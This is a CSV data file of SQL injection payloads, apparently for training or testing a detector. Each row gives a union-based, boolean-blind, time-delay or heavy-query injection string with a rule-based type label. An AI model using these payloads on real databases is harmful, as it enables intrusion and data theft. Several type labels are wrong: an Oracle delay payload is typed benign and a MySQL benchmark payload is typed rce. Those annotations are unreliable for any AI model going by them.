row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3030,select case when 8975 = 2352 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3031,"1%"" ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
3032,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3033,"1 ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 6583 = 6583",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
3034,"1' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3035,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'hmqq' = 'hmqq",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
3036,waitfor delay '0:0:5' and ( ( 7619 = 7619,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3037,1' ) where 4729 = 4729,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3038,"1"" where 9973 = 9973 and 2006 = 2006",1,,boolean_blind,generic,0.95,9973 = 9973 and detected — boolean_blind injection (priority 8) on generic,rule-based
3039,"-3954' ) ) union all select 2417,2417--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3040,"1' ) ) union all select null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3041,1'+ ( select 'njee' where 4101 = 4101 and 3090 = 7873 ) +',1,,boolean_blind,generic,0.95,4101 = 4101 and detected — boolean_blind injection (priority 8) on generic,rule-based
3042,"1"" ) ) as tybm where 2687 = 2687 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3043,"-6593"" ) union all select 6216,6216,6216,6216,6216,6216,6216#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3044,"1"" ) and make_set ( 4539 = 6401,6401 ) and ( ""kglx"" = ""kglx",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
3045,1' ) and 7290 = 8416 and ( 'ktlz' like 'ktlz,1,,boolean_blind,generic,0.95,"7290 = 8416 and, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
3046,"-8472' ) where 3340 = 3340 or make_set ( 1752 = 9905,9905 ) --",1,,boolean_blind,generic,0.95,3340 = 3340 or detected — boolean_blind injection (priority 8) on generic,rule-based
3047,"1"" ) where 9770 = 9770 union all select null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3048,"1'+ ( select ocvc where 6981 = 6981 union all select null,null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3049,"1 ) ) union all select null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3050,"-6214"" union all select 3323,3323#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3051,-7979'+ ( select 'bkvt' where 3613 = 3613 union all select 3613#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3052,"1'|| ( select 'ymwf' where 1229 = 1229 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) ||'",1,,boolean_blind,generic,0.95,1229 = 1229 or detected — boolean_blind injection (priority 8) on generic,rule-based
3053,select sleep ( 5 ) and ( ( 3404 = 3404,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3054,1'|| ( select 'fjlg' from dual where 9517 = 9517,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3055,"1 ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
